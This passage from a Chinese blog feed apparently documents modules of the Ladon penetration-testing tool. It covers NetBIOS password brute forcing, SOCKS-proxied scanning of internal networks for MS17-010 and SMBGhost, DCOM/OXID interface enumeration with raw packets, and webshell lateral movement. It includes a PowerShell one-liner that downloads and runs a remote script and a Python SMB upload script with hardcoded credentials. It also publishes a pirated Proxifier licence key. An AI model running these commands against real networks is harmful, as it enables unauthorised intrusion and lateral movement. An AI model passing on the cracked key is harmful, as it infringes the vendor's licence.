ipc$整个通信过程，先445-&gt;137-&gt;139验证，当你开启防火墙禁用445，发现系统命令就无法连接IPC了，根本没机会走到139，所以使用系统自带命令连接的ipc$需要同时开启这些端口。说入侵139就是IPC$的说法是错误的，就像说wmiexec.vbs可完全替代PSEXEC工具一样，这个脚本需要目标开启135和445，因为它通过445来传输结果，意味着目标只开放135这个VBS的回显就没有了，其实假设目标只开放445，这个VBS脚本还能执行命令吗？哪来的替代或扔掉？这个系统的IPC$连接也是同理，测试首先得把其它端口禁了再说话。虽然系统自带命令需要同时开启，但是 自己实现SMB服务器的话是可以只使用139或只用445端口的，详情参考impacket。</p><h3 id="Nbt爆破"><a href="#Nbt爆破" class="headerlink" title="Nbt爆破"></a>Nbt爆破</h3><p>系统自带命令需要同时开启139和445，但是 自己实现SMB服务器的话是可以只使用139或只用445端口的。系统的IPC$就像读取系统密码一样，可以先植入CS再用MIMI插件读取，但是我们也可以不使用CS，直接MIMI读取密码啊。基于和MIMI可以独立读取密码的原理，反向思路我们也可以完全不走445，直接通过139验证WINDOWS密码，所以这个和IPC$不一样(指的是系统命令连接的ipc)，所以为了防止大家误解，起名为NbtScan。毕竟走的也是Netbios，系统IPC$验证一是时间非常久，且必须开启445，如果445都开了为何不用SmbScan验证密码呢？但是由于近几年勒索病毒横行，可能很多机器默认会关闭445，所以会导致无法通过445验证密码，但是没关系还有139啊。</p><h3 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h3><h4 id="139端口-Netbios密码爆破-Windows"><a href="#139端口-Netbios密码爆破-Windows" class="headerlink" title="139端口 Netbios密码爆破(Windows)"></a>139端口 Netbios密码爆破(Windows)</h4><p>Ladon 192.168.1.8/24 NbtScan<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/NbtScan.PNG"></p><h3 id="PowerLadon"><a href="#PowerLadon" class="headerlink" title="PowerLadon"></a>PowerLadon</h3><h4 id="远程加载NbtScan-139端口弱口令爆破"><a href="#远程加载NbtScan-139端口弱口令爆破" class="headerlink" title="远程加载NbtScan 139端口弱口令爆破"></a>远程加载NbtScan 139端口弱口令爆破</h4><p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://192.168.1.3:800/Ladon7.1_all.ps1&#39;" target="_blank" rel="noopener">http://192.168.1.3:800/Ladon7.1_all.ps1&#39;</a>); Ladon 192.168.1.141 NbtScan”</p><h3 id="139传输文件"><a href="#139传输文件" class="headerlink" title="139传输文件"></a>139传输文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> smb.SMBConnection <span class="keyword">import</span> SMBConnection</span><br><span class="line"><span class="keyword">from</span> nmb.NetBIOS <span class="keyword">import</span> NetBIOS</span><br><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getBIOSName</span><span class="params">(remote_smb_ip, timeout=<span class="number">30</span>)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bios = NetBIOS()</span><br><span class="line">        srv_name = bios.queryIPForName(remote_smb_ip, timeout=timeout)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, <span class="string">"Looking up timeout, check remote_smb_ip again!!"</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        bios.close()</span><br><span class="line">        <span class="keyword">return</span> srv_name</span><br><span class="line">serverip=<span class="string">'192.168.1.40'</span></span><br><span class="line">conn = SMBConnection(<span class="string">'k8gege'</span>, <span class="string">'k8gege520'</span>, <span class="string">'C$'</span>,getBIOSName(serverip)[<span class="number">0</span>], use_ntlm_v2 = <span class="literal">True</span>) </span><br><span class="line"><span class="keyword">assert</span> conn.connect(serverip, <span class="number">139</span>)</span><br><span class="line"><span class="comment">#temdir='/'</span></span><br><span class="line"><span class="comment">#dir=os.path.join('/','public')</span></span><br><span class="line">f = open(<span class="string">'C:/123.txt'</span>, <span class="string">'rb'</span>)</span><br><span class="line">conn.storeFile(<span class="string">'Users'</span>,<span class="string">'234.txt'</span>,f)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;=============================================================================================&lt;br&gt;++++++++++++++++++++++++++++++++++++++++
      
    
    </summary>
    
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="netbios" scheme="http://k8gege.org/tags/netbios/"/>
    
  </entry>
  
  <entry>
    <title>〖教程〗Ladon Socks代理扫描(附Proxifier4.0注册码)</title>
    <link href="http://k8gege.org/p/proxy.html"/>
    <id>http://k8gege.org/p/proxy.html</id>
    <published>2020-07-18T03:40:00.000Z</published>
    <updated>2020-07-18T04:07:00.638Z</updated>
    
    <content type="html"><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/proxy.html";</script><h3 id="Socks代理工具"><a href="#Socks代理工具" class="headerlink" title="Socks代理工具"></a>Socks代理工具</h3><h4 id="windows平台"><a href="#windows平台" class="headerlink" title="windows平台"></a>windows平台</h4><p>Proxifier软件是一款极其强大的socks5客户端,同时也是一款强大的站长工具。Proxifier支持TCP，UDP协议，支持Xp，Vista，Win7，支持socks4，socks5，http代理协议可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。</p><p>2020年7月proxifier官方发布最新版4.0.1修复ipv6兼容问题，以及其它很多问题。 3.42支持类似chrome这样工作的69个应用程序，修复了一些第三方应用程序的兼容性。</p><p>以上更新日志，充分说明该代理工具不能保证兼容所有第3方程序，或者说兼容性不好，同样的3.31版本有人能代理Ladon，有人代理不了。 </p><p>官方下载: <a href="http://www.proxifier.com/download" target="_blank" rel="noopener">http://www.proxifier.com/download</a></p><h4 id="linux-mac平台"><a href="#linux-mac平台" class="headerlink" title="linux/mac平台"></a>linux/mac平台</h4><p>ProxyChains遵循GNU协议的一款适用于linux系统的网络代理设置工具。强制由任一程序发起的TCP连接请求必须通过诸如TOR 或 SOCKS4, SOCKS5 或HTTP(S) 代理。支持的认证方式包括：SOCKS4/5的用户/密码认证，HTTP的基本认证。允许TCP和DNS通过代理隧道，并且可配置多个代理。</p><p>ProxyChains代理工具非常好，真的可以兼容所有程序，不像proxifier好多程序还不定兼容，当然两者都有一定的丢包率，Ladon批量扫描功能过快超时短，可能会导致有些结果丢失，回头设置一个代理模式，提高超时放慢速度看看。</p><h3 id="代理支持协议"><a href="#代理支持协议" class="headerlink" title="代理支持协议"></a>代理支持协议</h3><p>通过以上两平台的代理工具简介，可以看出代理客户端并不支持ICMP协议。<br>所以使用它们代理，无法PING通内网主机。何况FRP、EW等也不支持ICMP。</p><h4 id="支持协议"><a href="#支持协议" class="headerlink" title="支持协议"></a>支持协议</h4><p>1.TCP<br>2.UDP</p><h4 id="代理协议"><a href="#代理协议" class="headerlink" title="代理协议"></a>代理协议</h4><p>1.SOCKS4<br>2.SOCKS5<br>3.HTTP(S)</p><h3 id="代理工具兼容性"><a href="#代理工具兼容性" class="headerlink" title="代理工具兼容性"></a>代理工具兼容性</h3><p>推荐proxifier 3.42及以上版本，最好是最新版，3.31及以前的兼容性极差，所以不推荐，我使用VM虚拟机12版本的时候，可以代理Ladon,但后面升级为15，发现很难代理，就连测试系统自带的telnet程序，都不行了。Ladon在多个虚拟机测试也是一样，但是有同事也是用3.31却可以代理使用，网上很多人也和我反应不能用。后来我看了下3.31是2016年的，就想看看官方有没更新，发现18年有个3.42版本，测试一下，兼容好多了，然后在星球发表，发表不久发现官方更新了4.0.1，只是他没写更新日志，还以为没有更新。</p><h3 id="Proxifier通用注册码"><a href="#Proxifier通用注册码" class="headerlink" title="Proxifier通用注册码"></a>Proxifier通用注册码</h3><p>4.0.1 (2020.7.7)<br>3.4.2 (2018.8.31)<br>3.3.1 (2016不推荐)<br>5EZ8G-C3WL5-B56YG-SCXM9-6QZAP（Standard Edition）</p><h3 id="Ladon工作原理"><a href="#Ladon工作原理" class="headerlink" title="Ladon工作原理"></a>Ladon工作原理</h3><p>由于proxifier客户端不支持ICMP或者说ew等代理工具也不支持ICMP协议，所以代理后探测存活主机就不要使用Ping或OnlinePC模块了，使用扫描模块需加noping参数，非扫描模块不需要noping。探测存活主机可使用osscan、webscan、urlscan、ms17010、smbghost等模块，他们能扫出东西不也意味着主机存活吗？ping不是唯一的探测存活主机存活方式，系统防火墙默认禁ping，使用ping探测本身就会错过很多存活主机，所以实战要结合多种方式探测。假设目标防火墙只允许smb协议通过，你用nmap端口扫描的TCP包被拦截显示成关的，但用ms17010，smbghost扫出漏洞或者用smbscan就显示密码错误拒绝访问等，这不就说明445确实开放吗？不要死板的老是停留在ping和单纯的端口扫描来探测存活主机，要考虑实际环境，OnlinePC可探测到大部分存活主机，但不等于能探测到全部存活主机，当你无法渗透已扫到的存活主机，就得尝试其它模块探测更多主机。</p><p>PS：如何验证代理是否支持ICMP协议，非常简单用系统自带命令PING目标内网IP（不要PING自己的内网哦），能PING通目标存活IP，说明代理支持ICMP协议，意味你可以像挂了目标VPN一样或者像本地一样随意扫描目标内网，如果根本PING不通，老老实实扫描时加上noping参数。</p><h3 id="Socks代理扫描"><a href="#Socks代理扫描" class="headerlink" title="Socks代理扫描"></a>Socks代理扫描</h3><p>例子：Socks5代理扫描目标10.1.2段是否存在MS17010漏洞<br>Ladon noping 10.1.2.8/24 MS17010</p><p>PS：再次强调，由于代理工具不支持ICMP，所以Ladon扫描类功能必须加noping参数，非扫描模块不需要。</p><h3 id="实战扫描结果"><a href="#实战扫描结果" class="headerlink" title="实战扫描结果"></a>实战扫描结果</h3><p>Linux SSH服务识别之22端口扫描<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/proxy_porscan22.png"></p><p>WEB HttpBanner扫描<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/proxy_httpscan.png"></p><p>永恒之默漏洞 SMBghost CVE-2020-0796<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/proxy_smbghost.png"></p><p>OSSCAN探测目标操作系统<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/proxy_osscan.png"></p><p>ProtScan端口扫描<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/proxy_porscan.png"></p><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;=============================================================================================&lt;br&gt;++++++++++++++++++++++++++++++++++++++++
      
    
    </summary>
    
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
    
      <category term="Proxy" scheme="http://k8gege.org/tags/Proxy/"/>
    
  </entry>
  
  <entry>
    <title>Ladon枚举远程主机网卡信息(OXID定位多网卡主机)</title>
    <link href="http://k8gege.org/p/ethscan.html"/>
    <id>http://k8gege.org/p/ethscan.html</id>
    <published>2020-07-17T12:45:00.000Z</published>
    <updated>2020-07-18T04:03:12.672Z</updated>
    
    <content type="html"><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/ethscan.html";</script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>OXID Resolver是在支持COM +的每台计算机上运行的服务。它执行两项重要职责：<br>存储与远程对象连接所需的RPC字符串绑定，并将其提供给本地客户端。<br>将ping消息发送到本地计算机具有客户端的远程对象，并接收在本地计算机上运行的对象的ping消息。</p><p><img alt="image" data-original="http://k8gege.org/k8img/Other/DCOM_OXID.PNG"></p><p>我们只需要向远程主机发以下两个包，再解析返回结果即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">        static byte[] s1 =&#123;</span><br><span class="line">0x05,0x00,0x0b,0x03,0x10,0x00,0x00,0x00,</span><br><span class="line">0x48,0x00,0x00,0x00,0x01,0x00,0x00,0x00,</span><br><span class="line">0xb8,0x10,0xb8,0x10,0x00,0x00,0x00,0x00,</span><br><span class="line">0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x00,</span><br><span class="line">0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,</span><br><span class="line">0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a,</span><br><span class="line">0x00,0x00,0x00,0x00,0x04,0x5d,0x88,0x8a,</span><br><span class="line">0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,</span><br><span class="line">0x2b,0x10,0x48,0x60,0x02,0x00,0x00,0x00</span><br><span class="line">     </span><br><span class="line">                          &#125;;</span><br><span class="line"></span><br><span class="line">        static byte[] s2 =&#123;</span><br><span class="line"></span><br><span class="line">0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,</span><br><span class="line">0x18,0x00,0x00,0x00,0x01,0x00,0x00,0x00,</span><br><span class="line">0x00,0x00,0x00,0x00,0x00,0x00,0x05,0x00</span><br><span class="line">     </span><br><span class="line">                          &#125;;</span><br></pre></td></tr></table></figure><h3 id="程序版本"><a href="#程序版本" class="headerlink" title="程序版本"></a>程序版本</h3><p>Ladon &gt;=7.0</p><h3 id="模块名称"><a href="#模块名称" class="headerlink" title="模块名称"></a>模块名称</h3><p>EthScan<br>OxidScan</p><h3 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h3><p>通过Windows的一些DCOM接口进行网卡进行信息枚举，定位多网卡主机，在无权限的情况下得知远程主机是否含有内网甚至VPN;当然也可以判定Windows主机,K8抓包发现xp和03系统有一段相同特征，WIN7-WIN10等也是相同特征，所以可区分是否WIN7以上系统。</p><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>1.Windows主机<br>2.开放135端口<br>3.DCOM&gt;=5.6（老外原文说5.6版本才可用，可能他写错了）<br>4.dcomcnfg配置中的“面向连接的TCP/IP”协议没有被移除</p><p>PS: 由于有一定条件限制，若该模块无法定位多网卡主机，也可使用OnlinePC、OsScan、WebScan、WhatCMS等模块探测，如多个IP同一个机器名，网样的网站标题，或同样的网卡MAC地址，也可定位多网卡主机，只是没有通过该方法好，毕竟一个是100%，一个是90%，比如负载均横同样的网站却不在同一台机器上。</p><h3 id="测试系统"><a href="#测试系统" class="headerlink" title="测试系统"></a>测试系统</h3><p>测试XP/Win7/Win8/Win10,2003/2008/2012均成功，2016和2019无环境未测，应该支持。</p><h3 id="EthScan模块用法"><a href="#EthScan模块用法" class="headerlink" title="EthScan模块用法"></a>EthScan模块用法</h3><h4 id="扫描指定主机"><a href="#扫描指定主机" class="headerlink" title="扫描指定主机"></a>扫描指定主机</h4><p>Ladon 192.168.1.8 EthScan</p><h4 id="扫描C段主机"><a href="#扫描C段主机" class="headerlink" title="扫描C段主机"></a>扫描C段主机</h4><p>Ladon 192.168.1.8/24 EthScan<br>Ladon 192.168.1.8/C EthScan</p><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/EthScan.PNG"></p><h4 id="批量扫描IP列表主机"><a href="#批量扫描IP列表主机" class="headerlink" title="批量扫描IP列表主机"></a>批量扫描IP列表主机</h4><p>ip.txt里放需要扫描的IP，使用以下命令即可<br>Ladon EthScan</p><h4 id="批量检测IP段（-24）"><a href="#批量检测IP段（-24）" class="headerlink" title="批量检测IP段（/24）"></a>批量检测IP段（/24）</h4><p>ip24.txt里放需要扫描的IP段，使用以下命令即可<br>Ladon EthScan</p><h4 id="批量检测IP段（-16）"><a href="#批量检测IP段（-16）" class="headerlink" title="批量检测IP段（/16）"></a>批量检测IP段（/16）</h4><p>ip16.txt里放需要扫描的IP段，使用以下命令即可<br>Ladon EthScan</p><h3 id="关闭135端口"><a href="#关闭135端口" class="headerlink" title="关闭135端口"></a>关闭135端口</h3><h4 id="防止通过135网卡探测"><a href="#防止通过135网卡探测" class="headerlink" title="防止通过135网卡探测"></a>防止通过135网卡探测</h4><p>运行dcomcnfg，打开“组件服务”→“计算机”，在“我的电脑”上右键点击，选“属性”；然后点默认属性，把“在此计算机上启用分布式COM（E）”的勾去掉，接着返回到“默认协议”，移除“面向连接的TCP/IP”协议。重启后发现135端口还是开放，但已无法探测机器名和网卡，不过WmiScan还可以扫描到密码。</p><p><img alt="image" data-original="http://k8gege.org/k8img/Other/wmi_rpc_no.PNG"></p><h4 id="彻底关闭135端口"><a href="#彻底关闭135端口" class="headerlink" title="彻底关闭135端口"></a>彻底关闭135端口</h4><p>运行regedit，进入注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc<br>右键点击Rpc,新建——项——输入 Internet<br>然后重启，再cmd,输入netstat -an,就发现135端口彻底消失，此时无法枚举网卡信息，也无法WMI扫描密码，无法WMI远程执行等。</p><p>PS：由于很多服务是互相依赖的关系，不推荐关闭以免影响系统服务，比如计划任务程序无法正常运行，磁盘碎片整理又依赖计划任务而打不开等。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/" target="_blank" rel="noopener">https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/</a></p><p><a href="https://payloads.online/archivers/2020-07-16/1?nsukey=oZl56gbIGgfxQcx%2F0HMnIkDOK1FvyCWabho4pheMAZ8WRjelIN1lFyf%2FmHcseWWhqnr%2FmmH2auwGTJDaANogm5UzmXCLggfgR%2FMkudQEJNkqWUsU6CSgCb%2FzUbrWP8kHd5jW5Ef%2FS7JxhKfzSFOdU7xdbahjeLVqv8CRKy3Wbv1gjhZZNsh6HJYxmWJ0AjK6mrrPaBaTRWg1zswyqwb1ng%3D%3D" target="_blank" rel="noopener">https://payloads.online/archivers/2020-07-16/1?nsukey=oZl56gbIGgfxQcx%2F0HMnIkDOK1FvyCWabho4pheMAZ8WRjelIN1lFyf%2FmHcseWWhqnr%2FmmH2auwGTJDaANogm5UzmXCLggfgR%2FMkudQEJNkqWUsU6CSgCb%2FzUbrWP8kHd5jW5Ef%2FS7JxhKfzSFOdU7xdbahjeLVqv8CRKy3Wbv1gjhZZNsh6HJYxmWJ0AjK6mrrPaBaTRWg1zswyqwb1ng%3D%3D</a></p><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;=============================================================================================&lt;br&gt;++++++++++++++++++++++++++++++++++++++++
      
    
    </summary>
    
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
      <category term="信息收集" scheme="http://k8gege.org/categories/Discover/"/>
    
    
      <category term="OXID" scheme="http://k8gege.org/tags/OXID/"/>
    
  </entry>
  
  <entry>
    <title>Ladon检测永恒之黑漏洞 SMBGhost CVE-2020-0796</title>
    <link href="http://k8gege.org/p/smbghost_cve_2020_0796.html"/>
    <id>http://k8gege.org/p/smbghost_cve_2020_0796.html</id>
    <published>2020-06-03T14:40:00.000Z</published>
    <updated>2020-07-04T16:42:22.361Z</updated>
    
    <content type="html"><![CDATA[<h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>2020年3月10日，微软在其官方SRC发布了CVE-2020-0796的安全公告（ADV200005，MicrosoftGuidance for Disabling SMBv3 Compression）,公告表示在Windows SMBv3版本的客户端和服务端存在远程代码执行漏洞。同时指出该漏洞存在于MicroSoft Server Message Block 3.1.1协议处理特定请求包的功能中，攻击者利用该漏洞可在目标SMB Server或者Client中执行任意代码。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>CVE-2020-0796漏洞影响运行Windows 10版本1903，Windows Server版本1903（服务器核心安装），Windows 10版本1909和Windows Server版本1909（服务器核心安装）的设备。根据Fortinet，其他Microsoft版本应受到影响。</p><h3 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h3><p>漏洞编号：CVE-2020-0796<br>漏洞别名：SMBGhost、永恒之黑<br>影响版本：Win10或2016 1903 | 1909<br>返回结果：IP、机器名、漏洞编号、操作系统版本</p><h3 id="无损扫描"><a href="#无损扫描" class="headerlink" title="无损扫描"></a>无损扫描</h3><p>通过检测SMB3.1.1是否启用压缩功能判定漏洞，和MS17010一样不会对目标造成任何损害，也不会被杀软拦截。</p><h3 id="SMBGhost漏洞检测"><a href="#SMBGhost漏洞检测" class="headerlink" title="SMBGhost漏洞检测"></a>SMBGhost漏洞检测</h3><h4 id="扫描指定主机SMBGhost漏洞"><a href="#扫描指定主机SMBGhost漏洞" class="headerlink" title="扫描指定主机SMBGhost漏洞"></a>扫描指定主机SMBGhost漏洞</h4><p>Ladon 192.168.1.8 SMBGhost</p><h4 id="扫描C段主机SMBGhost漏洞"><a href="#扫描C段主机SMBGhost漏洞" class="headerlink" title="扫描C段主机SMBGhost漏洞"></a>扫描C段主机SMBGhost漏洞</h4><p>Ladon 192.168.1.8/24 SMBGhost<br>Ladon 192.168.1.8/C SMBGhost</p><h4 id="批量扫描IP列表主机SMBGhost漏洞"><a href="#批量扫描IP列表主机SMBGhost漏洞" class="headerlink" title="批量扫描IP列表主机SMBGhost漏洞"></a>批量扫描IP列表主机SMBGhost漏洞</h4><p>ip.txt里放需要扫描的IP，使用以下命令即可<br>Ladon SMBGhost</p><h4 id="批量检测IP段（-24）SMBGhost漏洞"><a href="#批量检测IP段（-24）SMBGhost漏洞" class="headerlink" title="批量检测IP段（/24）SMBGhost漏洞"></a>批量检测IP段（/24）SMBGhost漏洞</h4><p>ip24.txt里放需要扫描的IP段，使用以下命令即可<br>Ladon SMBGhost</p><h4 id="批量检测IP段（-16）SMBGhost漏洞"><a href="#批量检测IP段（-16）SMBGhost漏洞" class="headerlink" title="批量检测IP段（/16）SMBGhost漏洞"></a>批量检测IP段（/16）SMBGhost漏洞</h4><p>ip16.txt里放需要扫描的IP段，使用以下命令即可<br>Ladon SMBGhost</p><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/SmbGhost.PNG"></p><h3 id="POC-EXP-LPE"><a href="#POC-EXP-LPE" class="headerlink" title="POC/EXP/LPE"></a>POC/EXP/LPE</h3><p><a href="https://github.com/danigargu/CVE-2020-0796" target="_blank" rel="noopener">https://github.com/danigargu/CVE-2020-0796</a><br><a href="https://github.com/chompie1337/SMBGhost_RCE_PoC" target="_blank" rel="noopener">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h3&gt;&lt;p&gt;2020年3月10日，微软在其官方SRC发布了CVE-2020-0796的安全公告（ADV200005，MicrosoftG
      
    
    </summary>
    
    
      <category term="提权" scheme="http://k8gege.org/categories/Lpe/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
      <category term="远程执行" scheme="http://k8gege.org/categories/Rce/"/>
    
    
      <category term="LPE" scheme="http://k8gege.org/tags/LPE/"/>
    
      <category term="RCE" scheme="http://k8gege.org/tags/RCE/"/>
    
      <category term="CVE-2020-0796" scheme="http://k8gege.org/tags/CVE-2020-0796/"/>
    
      <category term="SMBGhost" scheme="http://k8gege.org/tags/SMBGhost/"/>
    
  </entry>
  
  <entry>
    <title>〖教程〗Ladon连接WebShell一句话远程执行命令</title>
    <link href="http://k8gege.org/p/webshell.html"/>
    <id>http://k8gege.org/p/webshell.html</id>
    <published>2020-05-31T14:20:00.000Z</published>
    <updated>2020-06-06T02:23:48.793Z</updated>
    
    <content type="html"><![CDATA[<h1 id="在内网渗透中，横向移动用的最多的就是远程执行命令了，网上有很多相关工具，系统也自带相关命令。但不是体积大就是命令繁琐，如schtasks命令等，执行需先创建任务、执行任务、删除任务等，命令长，输错会浪费很多时间，即使复制粘贴也很麻烦。体积大的如Impacket中的psexec-atexec-smbexec-wmiexec等，若是使用PY2-7编译低版本最小也5M左右，最大可能37-5M，无论是内存加载或是传到目标都很麻烦，如果后渗透工具垃圾，区区这几M还未必能传上去，传上去得浪费很多时间。传一个就5M，传4个不得20M-基于以上原因，Ladon添加常用的远程执行命令功能，6-5体积仅844K就包含以上工具功能，扫描到相关密码，即可使用对应模块横向移动，一站式工具，完美一条龙服务。"><a href="#在内网渗透中，横向移动用的最多的就是远程执行命令了，网上有很多相关工具，系统也自带相关命令。但不是体积大就是命令繁琐，如schtasks命令等，执行需先创建任务、执行任务、删除任务等，命令长，输错会浪费很多时间，即使复制粘贴也很麻烦。体积大的如Impacket中的psexec-atexec-smbexec-wmiexec等，若是使用PY2-7编译低版本最小也5M左右，最大可能37-5M，无论是内存加载或是传到目标都很麻烦，如果后渗透工具垃圾，区区这几M还未必能传上去，传上去得浪费很多时间。传一个就5M，传4个不得20M-基于以上原因，Ladon添加常用的远程执行命令功能，6-5体积仅844K就包含以上工具功能，扫描到相关密码，即可使用对应模块横向移动，一站式工具，完美一条龙服务。" class="headerlink" title="在内网渗透中，横向移动用的最多的就是远程执行命令了，网上有很多相关工具，系统也自带相关命令。但不是体积大就是命令繁琐，如schtasks命令等，执行需先创建任务、执行任务、删除任务等，命令长，输错会浪费很多时间，即使复制粘贴也很麻烦。体积大的如Impacket中的psexec/atexec/smbexec/wmiexec等，若是使用PY2.7编译低版本最小也5M左右，最大可能37.5M，无论是内存加载或是传到目标都很麻烦，如果后渗透工具垃圾，区区这几M还未必能传上去，传上去得浪费很多时间。传一个就5M，传4个不得20M?基于以上原因，Ladon添加常用的远程执行命令功能，6.5体积仅844K就包含以上工具功能，扫描到相关密码，即可使用对应模块横向移动，一站式工具，完美一条龙服务。"></a>在内网渗透中，横向移动用的最多的就是远程执行命令了，网上有很多相关工具，系统也自带相关命令。但不是体积大就是命令繁琐，如schtasks命令等，执行需先创建任务、执行任务、删除任务等，命令长，输错会浪费很多时间，即使复制粘贴也很麻烦。体积大的如Impacket中的psexec/atexec/smbexec/wmiexec等，若是使用PY2.7编译低版本最小也5M左右，最大可能37.5M，无论是内存加载或是传到目标都很麻烦，如果后渗透工具垃圾，区区这几M还未必能传上去，传上去得浪费很多时间。传一个就5M，传4个不得20M?基于以上原因，Ladon添加常用的远程执行命令功能，6.5体积仅844K就包含以上工具功能，扫描到相关密码，即可使用对应模块横向移动，一站式工具，完美一条龙服务。</h1><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/webshell.html";</script><p><a href="http://k8gege.org/Ladon/webshell.html">http://k8gege.org/Ladon/webshell.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;在内网渗透中，横向移动用的最多的就是远程执行命令了，网上有很多相关工具，系统也自带相关命令。但不是体积大就是命令繁琐，如schtasks命令等，执行需先创建任务、执行任务、删除任务等，命令长，输错会浪费很多时间，即使复制粘贴也很麻烦。体积大的如Impacket中的
      
    
    </summary>
    
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
      <category term="远程执行" scheme="http://k8gege.org/categories/Rce/"/>
    
    
